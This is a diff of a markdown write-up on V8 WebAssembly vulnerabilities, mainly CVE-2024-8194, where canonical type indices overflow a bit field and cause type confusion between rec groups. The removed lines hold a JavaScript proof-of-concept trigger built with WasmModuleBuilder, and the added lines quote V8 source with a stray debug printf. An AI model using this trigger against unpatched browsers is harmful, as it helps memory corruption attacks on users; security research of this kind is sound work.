@@ -396,52 +396,52 @@ ValueType TypeCanonicalizer::CanonicalizeValueType(
   // maxium(heap_type) = 2^20 = 0x200000
   // maximum(wasm_type) = 1000000 < maxium(heap_type)
 
+  /* In encode function, they don't truncate value field
+  */
+  // Returns a type U with the bit field value encoded.
+  static constexpr U encode(T value) {
+    DCHECK(is_valid(value));
+    return static_cast<U>(value) << kShift;
+  }
+  // Extracts the bit field from the value.
+  static constexpr T decode(U value) {
+    return static_cast<T>((value & kMask) >> kShift);
+  }
+
 ```
+
+- In encode function, they don't truncate value field. So if the `heap_type` is equal (2^21), that turns into canonical bool enable
+
 
 - The purpose of `TypeCanonicalizer::CanonicalizeValueType` function is canonicalize a ValueType
 => canonical_type_idx max was at 1 << 20, but wasm::ValueType's max at 1000000. This could lead to field overflow.
 
+**Conclude**
 
-
-```js
-let builder = new WasmModuleBuilder();
-// target rec group
-builder.startRecGroup();
-builder.addStruct([makeField(wasmRefType(3), true)]);   // tidx 0, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
-builder.addArray(kWasmI32, true);                       // tidx 1, cidx 4
-builder.addArray(kWasmI32, true);                       // tidx 2, cidx 5
-builder.addStruct([makeField(kWasmExternRef, true)]);   // tidx 3, cidx 6 (ridx 3)
-builder.endRecGroup();
-let instance = builder.instantiate();   // total canon 7
-
-reserve(1000000 - 7);                   // total canon 1000000
-reserve(0x100003 - 1000000);            // total canon 0x1000003
-
-builder = new WasmModuleBuilder();
-let $s1 = builder.addStruct([makeField(kWasmI32, true)]);   // tidx 0, cidx 0x100003
-// target rec group
-builder.startRecGroup();
-let $s2 = builder.addStruct([makeField(wasmRefType(4), true)]);     // tidx 1, cidx 3 / field { (HeapTypeField 3, CanonicalRelativeField 1) = 0x100003 } 
-builder.addArray(kWasmI32, true);                                   // tidx 2, cidx 4
-builder.addArray(kWasmI32, true);                                   // tidx 3, cidx 5
-let $s3 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 4, cidx 6 (ridx 3)
-builder.endRecGroup();
-// rec group that canonicalizes into target rec group
-builder.startRecGroup();
-let $s4 = builder.addStruct([makeField(wasmRefType($s1), true)]);   // tidx 5, cidx 3? / field { (HeapTypeField 0x100003, CanonicalRelativeField 0) = 0x100003 } 
-builder.addArray(kWasmI32, true);                                   // tidx 6, cidx 4?
-builder.addArray(kWasmI32, true);                                   // tidx 7, cidx 5?
-let $s5 = builder.addStruct([makeField(kWasmExternRef, true)]);     // tidx 8, cidx 6?
-builder.endRecGroup();
-// ...
-let instance2 = builder.instantiate();
+```c++
+ValueType TypeCanonicalizer::CanonicalizeValueType(
+    const WasmModule* module, ValueType type,
+    uint32_t recursive_group_start) const {
+  if (!type.has_index()) return type;
+  printf("CanonicalizeValueType: type.ref_index() = %d\n", type.ref_index());
+  return type.ref_index() >= recursive_group_start
+             ? ValueType::CanonicalWithRelativeIndex(
+                   type.kind(), type.ref_index() - recursive_group_start)
+             : ValueType::FromIndex(
+                   type.kind(),
+                   module->isorecursive_canonical_type_ids[type.ref_index()]);
+}
 
 ```
 
-The cidx of `0x100003` is loaded into HeapTypeField, overflowing into CanonicalRelativeField into 1, which make RecGroup 2 is canonicalized into RecGroup 1. However, they are not equivalent.
+*`CanonicalWithRelativeIndex` function enables `CanonicalRelativeField` at `2^21`, while `FromIndex` just shifts `index` with truncating if it's larger than `2^20`*
 
-Reported issue: https://issues.chromium.org/issues/360533914
-[POC](pocs/CVE-2024-8194.js)
+
+> The cidx of `0x100003` is loaded into HeapTypeField, overflowing into CanonicalRelativeField into 1, which make RecGroup 2 is canonicalized into RecGroup 1. However, they are not equivalent.
+
+- Reported issue: https://issues.chromium.org/issues/360533914
+
+- [POC](pocs/CVE-2024-8194.js)
 
 ### CVE-2024-9859 - Confusion between ValueType and CanonicalType in HE
 When encoding a JS value in a wasm exception, it should be canonicalized first, since JSToWasmObject takes CanonicalValueType as an argument:
